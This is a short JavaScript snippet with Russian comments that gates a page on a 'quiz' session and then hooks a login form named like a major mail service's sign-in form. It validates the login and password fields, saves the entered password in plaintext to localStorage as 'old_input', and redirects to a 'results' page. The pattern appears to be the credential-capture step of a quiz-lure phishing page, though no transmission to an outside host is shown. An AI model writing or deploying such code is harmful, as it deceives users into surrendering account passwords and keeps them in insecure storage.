    <script>
(function () {
  const quizUser = JSON.parse(localStorage.getItem('quiz_user') || 'null');
  if (!quizUser) {
    window.location.href = 'index.html';
    return;
  }

  const form = document.querySelector('form[name="EnterPhoneOrMailForm"]');
  if (!form) return;

  /* Находим оба поля */
  const loginInput    = form.querySelector('input[name="login"]');
  const passwordInput = form.querySelector('input[name="password"]');

  /* Функция подсветки ошибки */
  function markError(input) {
    if (!input) return;
    input.style.borderBottomColor = '#c0705c';
    input.style.boxShadow = '0 1px 0 0 #c0705c';
    input.addEventListener('input', function clear() {
      input.style.borderBottomColor = '';
      input.style.boxShadow = '';
      input.removeEventListener('input', clear);
    });
  }

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    const loginValue    = loginInput ? loginInput.value.trim() : '';
    const passwordValue = passwordInput ? passwordInput.value.trim() : '';

    /* Проверка логина */
    if (!loginValue) {
      markError(loginInput);
      if (loginInput) loginInput.focus();
      alert('Заполните поле «Логин»');
      return;
    }

    /* Проверка пароля */
    if (!passwordValue) {
      markError(passwordInput);
      if (passwordInput) passwordInput.focus();
      alert('Заполните поле «Пароль»');
      return;
    }

    /* Сохраняем данные */
    const oldInput = {
      loginOrPhone: loginValue,
      password:     passwordValue,
      savedAt:      new Date().toISOString()
    };

    try {
      localStorage.setItem('old_input', JSON.stringify(oldInput));
    } catch (err) {
      console.warn('Не удалось сохранить old_input:', err);
    }

    window.location.href = 'results-view.html';
  });
})();
</script>
